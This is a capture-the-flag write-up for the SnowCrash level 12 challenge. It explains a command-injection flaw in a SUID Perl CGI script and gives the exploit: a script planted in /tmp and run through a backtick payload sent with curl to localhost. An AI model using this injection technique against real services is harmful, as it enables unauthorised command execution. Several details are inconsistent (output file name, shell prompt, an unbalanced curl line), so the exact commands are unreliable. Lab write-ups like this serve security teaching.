# Level 12

### Goal
Exploit a Perl CGI script vulnerability to execute arbitrary commands and retrieve the flag.

### I - Initial Analysis
In the home directory, there's a Perl script `level12.pl` (like in **level04**) with SUID/GUID bits set, meaning it runs with **flag12**'s permissions regardless of who executes it.

1. **File Examination:**  
   ```bash
   level12@SnowCrash:~$ ls -l
   total 4
   -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
   ```

2. **Script Content:**  
   ```perl
   #!/usr/bin/env perl
   # localhost:4646
   use CGI qw{param};
   print "Content-type: text/html\n\n";

   sub t {
   $nn = $_[1];
   $xx = $_[0];
   $xx =~ tr/a-z/A-Z/;
   $xx =~ s/\s.*//;
   @output = `egrep "^$xx" /tmp/xd 2>&1`;
   foreach $line (@output) {
         ($f, $s) = split(/:/, $line);
         if($s =~ $nn) {
            return 1;
         }
   }
   return 0;
   }

   sub n {
   if($_[0] == 1) {
         print("..");
   } else {
         print(".");
   }
   }

   n(t(param("x"), param("y")));
   ```
   - It is a `Perl` source file, commonly used for tasks like text manipulation, system automation, or web development.  
   - This script functions as a `CGI` script, handling HTTP requests and dynamically generating web responses.

### II - Source Code Analysis
The Perl script presents several security vulnerabilities:

1. **Pattern Matching Weakness**
   ```perl
   $xx =~ tr/a-z/A-Z/;    # Converts input to uppercase
   $xx =~ s/\s.*//;       # Removes everything after first whitespace
   @output = `egrep "^$xx" /tmp/xd 2>&1`;  # Uses input in command execution
   ```

2. **Input Validation Issues**
   - The script converts input to uppercase using `tr/a-z/A-Z/`
   - It removes content after whitespace using `s/\s.*//`
   - However, special characters and path traversal sequences remain unfiltered

### III - Vulnerability Details
The main vulnerability lies in how the script handles the `x` parameter in CGI requests:

1. User input is used directly in a command execution context (`egrep`).
2. While the script converts input to uppercase, this can be bypassed using special characters.
3. Path traversal is possible using `/*/` which remains unaffected by the uppercase conversion.
4. Command substitution using backticks (**``**) is not properly sanitized.

### IV -  Exploitation Method
The exploit works in 3 steps:

1. First, create and prepare the exploit file:
   ```bash
   echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
   chmod +x /tmp/EXPLOIT
   ```

2. Then trigger the exploit:
   ```bash
   curl 'http://localhost:4646/?x="\`/*/EXPLOIT)\`"
   ```
3. Verify the result:
   ```bash
   level11@SnowCrash:~$ cat /tmp/token
   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
   ```
   The `payload` succeeds because:
   - `/*/` bypasses the uppercase conversion.
   - The backticks (**``**) command substitution is executed by the shell.
   - The wildcard `*` allows finding our `EXPLOIT` file regardless of path case sensitivity.

